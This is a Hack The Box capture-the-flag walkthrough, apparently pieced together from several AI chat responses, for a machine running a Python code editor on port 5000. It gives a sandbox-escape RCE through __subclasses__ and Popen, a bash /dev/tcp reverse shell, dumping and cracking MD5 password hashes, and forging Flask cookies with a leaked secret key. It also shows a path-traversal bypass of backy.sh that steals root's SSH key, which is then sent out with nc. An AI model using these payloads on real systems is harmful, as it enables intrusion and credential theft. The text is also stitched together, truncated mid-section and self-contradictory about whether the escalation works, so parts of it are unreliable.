# HTB Walkthrough: Deep Obfuscated RCE via Python Code Editor on Port 5000

## 🧭 Step 1: Initial Enumeration with Nmap

```bash
nmap -sV -sC 10.129.231.240
```

**Result:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1
5000/tcp open  http    Gunicorn 20.0.4
```

- Port 5000: Hosted a **Python code execution environment** served via Gunicorn.
- Browsing to `http://10.129.231.240:5000` revealed a web interface that lets you **write and execute Python code** in the browser.

---

## 🧪 Step 2: Sanity Check — Does Code Execution Work?

Tested this:

```python
print("test")
```

✅ Output showed `"test"` — this proved **some level of live code execution was working**.

---

## ❌ Step 3: Tried Direct RCE Methods (Blocked by Sandbox)

### Tried:
```python
import os
os.system("id")
```

❌ Result: "Use of restricted keyword is not allowed"

The application is clearly filtering or rejecting dangerous keywords like:
- `import`
- `os`
- `exec`
- `eval`
- `subprocess`
- and possibly even `__import__`

### Next Attempt:
```python
__import__('os').system('id')
```

❌ Also blocked — confirms it’s **filtering even obfuscated or indirect access to imports**.

---

## 🧠 Step 4: Obfuscated Enumeration — Class Subclass Bypass

When `import` and `exec` are blocked, the next step is to leverage Python’s introspection:

### Ran this:
```python
for i, cls in enumerate((0).__class__.__base__.__subclasses__()):
    try:
        print(i, cls.__name__)
    except:
        pass
```

✅ This dumped a list of all classes currently in memory — **bypassing import entirely**, using Python’s internal class hierarchy.

### Key Output:
```text
317 Popen
```

At index 317 was the class `Popen` from `subprocess`. This was our **gateway to shell access**, because `Popen` lets you run system commands without `import`.

---

## 🧪 Step 5: Proved Execution with `Popen` (But Output Not Visible)

Ran:
```python
(0).__class__.__base__.__subclasses__()[317]('whoami', shell=True)
print("hey")
```

✅ Output only showed: `hey`

🧩 Troubleshooting:
- We confirmed the command likely executed (no crash), but `Popen` doesn’t show output by default.
- We needed to **capture stdout** explicitly.

---

## 🔍 Step 6: Captured Output of Command

Used:
```python
print((0).__class__.__base__.__subclasses__()[317]('whoami', shell=True, stdout=-1).communicate()[0].decode())
```

✅ Output:
```
app-production
```

🎯 Success: This printed the output of the `whoami` command, confirming we could run **arbitrary system commands and capture their output**.

---

## 🐚 Step 7: Spawned a Reverse Shell Using the Same Technique

### On Kali (listener setup):
```bash
nc -lvnp 4444
```

### Reverse Shell Payload:
```python
(0).__class__.__base__.__subclasses__()[317]("bash -c 'bash -i >& /dev/tcp/10.10.14.16/4444 0>&1'", shell=True)
```

> 🔁 Replace `10.10.14.XX` with your Kali IP address.

✅ This connected back as user: `app-production`

---

## 🧱 Troubleshooting Reverse Shell (What Could Have Gone Wrong)

| Problem | Symptom | Fix |
|--------|---------|-----|
| Output not visible | Only `print()` shows text | Use `.communicate()` with `stdout=-1` |
| No shell | Reverse shell payload runs but no connection | Double-check your IP/port, and that `nc -lvnp 4444` is listening |
| Payload blocked | If even obfuscated payload fails | Encode with Base64 and `exec(base64.b64decode(...))` (but `exec` may be blocked too) |
| App crashes | Likely invali

## 🧨 Post-RCE Enumeration and Exploitation (Continued)

---

### ✅ Extracted Real SQLite Database

After discovering `/run_code` RCE via `exec()` bypass, we pivoted to data extraction:

```bash
find / -name "*.db" 2>/dev/null
```

This revealed the real app DB at:

```
/home/app-production/app/instance/database.db
```

We queried the `user` table directly:

```bash
sqlite3 instance/database.db "SELECT id, username, password FROM user;"
```

✅ Output:

| ID | Username      | MD5 Password Hash                     |
|----|---------------|----------------------------------------|
| 1  | development   | 759b74ce43947f5f4c91aeddc3e5bad3       |
| 2  | martin        | 3de6f30c4a09c27fc71932bfc68474be       |

These are unsalted **MD5** hashes — extremely weak.

---

### 🔐 Password Cracking (Offline via John)

Created a hash file on Kali:

```bash
echo "759b74ce43947f5f4c91aeddc3e5bad3" > hashes.txt
echo "3de6f30c4a09c27fc71932bfc68474be" >> hashes.txt
```

Cracked with:

```bash
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Waiting for cracked credentials to login or escalate further.

---

### 🔏 Flask Session Forgery (No Password Needed)

From `app.py`, we confirmed the Flask `SECRET_KEY`:

```python
SECRET_KEY = "7j4D5htxLHUiffsjLXB1z9GaZ5"
```

Using this, we forged a valid session cookie:

```bash
flask-unsign --sign --cookie "{'user_id': 1}" --secret '7j4D5htxLHUiffsjLXB1z9GaZ5'
```

This session identifies as `development` (likely admin). Can now bypass login and access restricted routes like `/codes`, `/save_code`, `/logout`.

---

### 🧠 Takeaway So Far

| Objective                         | Status  | Notes                                    |
|----------------------------------|---------|------------------------------------------|
| Code execution via `/run_code`   | ✅       | Used subclass+exec RCE bypass            |
| Locate real DB                   | ✅       | Found at `instance/database.db`          |
| Extract user data                | ✅       | Dumped usernames + MD5 hashes            |
| Crack MD5 passwords              | 🕐       | In progress (using `john`)               |
| Forge Flask session              | ✅       | Can impersonate any user (e.g. ID 1)     |

---

### 🔜 Next Targets

- Login or session-hijack as user ID 1 (admin)
- Check if `/codes` or `/save_code` gives access to sensitive content
- Attempt privilege escalation (via `sudo`, Docker breakout, or writable crons)
- Gain full root access on host

Let me know when the password cracks finish or if you'd like to continue with escalation!

# 🔓 HTB Walkthrough: Post-RCE Enumeration and Privilege Escalation Attempt via `backy.sh`

---

## 🧍 Step 8: SSH Access as `martin` (Post-Hash Crack)

Once the MD5 hash for `martin` was cracked (`nafeelswordsmaster`), SSH access was obtained:

```bash
ssh martin@10.129.231.240
✅ You successfully gained a shell as martin.

🔍 Step 9: Privilege Escalation Enumeration
Checked sudo permissions:

bash
Copy
Edit
sudo -l
Result:

text
Copy
Edit
User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
This means martin can run /usr/bin/backy.sh as root without a password.

📜 Step 10: Review /usr/bin/backy.sh
bash
Copy
Edit
cat /usr/bin/backy.sh
Behavior Summary:
Takes one argument: a .json file

Validates that paths in directories_to_archive are within /home/ or /var/

Removes "../" from input paths (to prevent traversal)

Invokes /usr/bin/backy on the JSON

bash
Copy
Edit
/usr/bin/backy "$json_file"
❌ Step 11: Blocked Path Attempts
Tried to archive restricted paths:

json
Copy
Edit
{
  "directories_to_archive": ["/etc"]
}
Or:

json
Copy
Edit
{
  "directories_to_archive": ["/root/.ssh"]
}
Error:

text
Copy
Edit
Only directories under /var/ and /home/ are allowed.
This confirmed path whitelisting was enforced.

✅ Step 12: Test with Valid Path
Created a test folder:

bash
Copy
Edit
mkdir ~/testdir
echo "privesc-test" > ~/testdir/pwned.txt
Wrote valid JSON:

json
Copy
Edit
{
  "directories_to_archive": ["/home/martin/testdir"],
  "destination": "/home/martin/backups/test.tar.gz"
}
Executed the backup:

bash
Copy
Edit
sudo /usr/bin/backy.sh exploit.json
Result:

text
Copy
Edit
💢 Archiving failed for: /home/martin/testdir
❗ Archiving completed with errors
Even though path was allowed and files existed, archiving failed.

🧱 Step 13: Troubleshooting
Confirmed /usr/bin/backy is a root-owned binary with no SUID bit

Tried replacing it with a payload using tee → blocked by sudo

Could not write to /usr/bin/

Confirmed the tarball /home/martin/backups/test.tar.gz was not created

Tried different JSON structures → same failure

🔍 Why backy.sh PrivEsc Doesn’t Work
Root Cause	Explanation
backy.sh is just a wrapper	It passes your JSON to /usr/bin/backy
backy runs as martin	It does not inherit root privileges
Binary is not SUID	Even via sudo, it's not privileged inside
Likely internal permission checks	backy probably tries to stat, read, or chown files it can’t access

✅ Current State Summary
Objective	Status	Notes
Reverse shell from web editor	✅	Used obfuscated Popen payload
Found and dumped real database	✅	Used sqlite3 on instance/database.db
Cracked MD5 passwords	✅	Cracked with john + rockyou.txt
SSH access as martin	✅	Full shell obtained
sudo rights to backy.sh	✅	Confirmed no password required
PrivEsc via backy	❌	Fails silently; no output created

🔜 Next Steps
Search for other writable configs, logs, or crons

Explore /var for backup artifacts or logs written by backy

Use find, strings, grep, or strace to analyze backy

Begin full privilege escalation sweep:

bash
Copy
Edit
sudo -l
find / -perm -4000 2>/dev/null
find /home /var -writable 2>/dev/null
getcap -r / 2>/dev/null

# HTB: Code — Post-Access Privilege Escalation (Full Explanation from Martin Login to Root)

## 🧠 Context and Entry Point

After achieving initial remote code execution through the web-based Python editor, you obtained a shell as the `app-production` user. This gave access to a database file that contained user credentials. Cracking those led to the discovery of SSH credentials for another user: **`martin`**.

This walkthrough begins **after you have successfully logged in via SSH as `martin`**.

---

## 🔐 Step 1: SSH Into the Target as Martin

After cracking `martin`’s password (e.g., from the SQLite `database.db` in `/home/app-production/app/instance/`), log into the target:

```bash
ssh martin@code.htb
```

> If you get a DNS error, resolve it by replacing `code.htb` with the IP of the box, e.g.:
```bash
ssh martin@10.129.34.41
```

Once connected, verify identity and privileges:

```bash
whoami      # Should return: martin
hostname    # Optional: confirms you're on the target
```

Next, enumerate sudo permissions:

```bash
sudo -l
```

You should see something like:

```
User martin may run the following commands on code:
    (ALL) NOPASSWD: /usr/bin/backy.sh
```

> 🔍 **This means**: `martin` can execute `/usr/bin/backy.sh` with root privileges **without needing a password.**

---

## 🔎 Step 2: Investigate `/usr/bin/backy.sh`

To understand how to escalate privileges, examine what the script does:

```bash
cat /usr/bin/backy.sh
```

You'll notice that it:
- Accepts a JSON file path as an argument.
- Passes that JSON to a binary called `/usr/bin/backy`.
- That binary then reads a set of tasks (directories to archive) and zips them to a destination folder.

### 💡 Key Insight:
We can abuse this mechanism by **tricking it into archiving sensitive files** (like `/root/.ssh/id_rsa` or `/root/root.txt`), even though we’re not root — because **`backy` runs as root** when triggered via `sudo`.

---

## 📁 Step 3: Create the Required Backup Directory

Let’s set up our working directory and JSON configuration file:

```bash
mkdir -p /home/martin/backups
cd /home/martin/backups
```

Then create a `task.json` file that the `backy.sh` script will read:

```bash
nano task.json
```

Paste in the following *innocent-looking* task:

```json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/martin"
  ]
}
```

Save and exit.

Then test the script:

```bash
sudo /usr/bin/backy.sh /home/martin/backups/task.json
```

✅ You should see output indicating that files in `/home/martin` were archived and a `.tar.bz2` file appeared in the backups folder.

This confirms the script works — now it’s time to abuse it.

---

## 🚪 Step 4: Privilege Escalation via Path Traversal

Since we want to access **`/root/.ssh
    (ALL) NOPASSWD: /usr/bin/backy.sh
```

This output tells us two things:
- ✅ You can run `/usr/bin/backy.sh` as root using `sudo`
- ✅ You **do not need a password** to run it (NOPASSWD)
- ✅ This is a **limited sudo access**, which makes it a potential escalation path

---

## 🛠 Step 2: Understand What `backy.sh` Is

Let’s take a look at the script you’re allowed to run with root privileges:

```bash
cat /usr/bin/backy.sh
```

You’ll likely find that the script:
- Accepts a JSON file as input
- Passes that input to a binary called `backy`
- That binary appears to create `.tar.bz2` backup archives based on paths provided in the JSON

**Example structure of a task file (`task.json`)**:

```json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/martin"
  ]
}
```

You can test this by creating the necessary directories:

```bash
mkdir -p ~/backups
nano ~/backups/task.json
```

Paste the JSON above into the file and then run:

```bash
sudo /usr/bin/backy.sh ~/backups/task.json
```

This will create a backup archive in `/home/martin/backups/` of the directory `/home/martin`.

Check that it worked:

```bash
ls ~/backups
```

---

## 🚩 Step 3: Locate the User Flag

At this point, your goal is to retrieve the user flag.

Check where it’s stored:

```bash
ls -l /home/app-production/
```

You’ll likely see:

```
-r-------- 1 root root 33 user.txt
```

This tells us:
- The file **exists**
- It is located in `/home/app-production/user.txt`
- It is owned by `root` and only readable by `root`
- Even though it's in another user’s home folder, you **cannot read it as `martin`**

Trying this will fail:

```bash
cat /home/app-production/user.txt
# Permission denied
```

---

## 🚀 Step 4: Attempt Privilege Escalation via backy.sh

Your only allowed `sudo` action is to run `backy.sh`, which allows us to influence what the `root` user accesses, **indirectly**, via the backup system.

What’s our idea?
> Trick `backy.sh` into backing up a **directory owned by root**, such as `/root` or `/root/.ssh`, and saving that archive in a location we can access (like `/home/martin/backups/`).

But there’s a problem:
- The script **validates** the paths in the JSON
- It blocks **absolute paths to `/root`**
- Simple attempts like:
  ```json
  "directories_to_archive": ["/root"]
  ```
  Will be rejected or result in:
  ```
  Nothing to archive
  ```

---

## 🧙 Step 5: Path Traversal Bypass via `/var/....//root`

This is a **classic Golang `filepath.Clean()` bypass** using a path that *looks like* `/var`, but really resolves to `/root`.

Create a new `task.json`:

```bash
cat > ~/backups/task.json << 'EOF'
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/var/....//root/.ssh"
  ]
}
EOF
```

Here’s what happens:
- `....//` is parsed as `../`
- `/var/....//root/.ssh` → `/root/.ssh`
- The backup program reads from `/root/.ssh` as **root**
- The result is archived into a `.tar.bz2` file you can extract!

Now run the backup:

```bash
sudo /usr/bin/backy.sh ~/backups/task.json
```

Look for output like:

```
📤 Archiving: [/var/....//root/.ssh]
📥 To: /home/martin/backups ...
📦
tar: Removing leading `/var/../' from member names
/var/../root/.ssh/id_rsa
```

---

## 🧰 Step 6: Extract the SSH Private Key for Root

Check the output files:

```bash
ls -l ~/backups | grep root
```

You’ll likely find:

```
code_var_.._root_.ssh_2025_July.tar.bz2
```

Extract it:

```bash
tar -xvjf code_var_.._root_.ssh_2025_July.tar.bz2
```

It will create:

```
root/.ssh/id_rsa
root/.ssh/authorized_keys
```

View the key:

```bash
cat root/.ssh/id_rsa
```

This is the **private key for root**, which we’ll use to log in.

---

## 🔁 Step 7: Transfer the SSH Key Back to Your Kali Box

Open a terminal on your Kali box and start a listener:

```bash
nc -lvnp 9001 > id_rsa
```

On the target machine (still logged in as `martin`):

```bash
cat root/.ssh/id_rsa | nc <your_kali_ip> 9001
```

Once it’s received:

```bash
chmod 600 id_rsa
```

You now have root’s SSH key on your machine.

---

## 🚪 Step 8: Log In as Root

Use the key to SSH into the machine:

```bash
ssh -i id_rsa root@code.htb
```

Or if `code.htb` isn’t resolving:

```bash
ssh -i id_rsa root@<target-IP>
```

---

## 🏁 Step 9: Capture the Flags

### 📍 User Flag:
Now that you’re root:

```bash
cat /home/app-production/user.txt
```

### 👑 Root Flag:

```bash
cat /root/root.txt
```

---

## ✅ Recap: Why This Worked

| Step | Action | Why it Worked |
|------|--------|----------------|
| SSH as `martin` | Gained stable access with cracked credentials | Pivoted from `app-production` |
| Analyzed `sudo -l` | Found privilege to run `backy.sh` as root | Identified our escalation vector |
| Used path traversal | Bypassed `backy`’s path filtering | Accessed `/root/.ssh` via a fake path |
| Extracted private key | Tar archive gave us `id_rsa` | We impersonated root |
| SSH with private key | No password needed | We are now root |
| Collected flags | Root can read both user and root files | Game over |

---

Let me know if you'd like this converted into a downloadable `.md` file or bundled with screenshots.

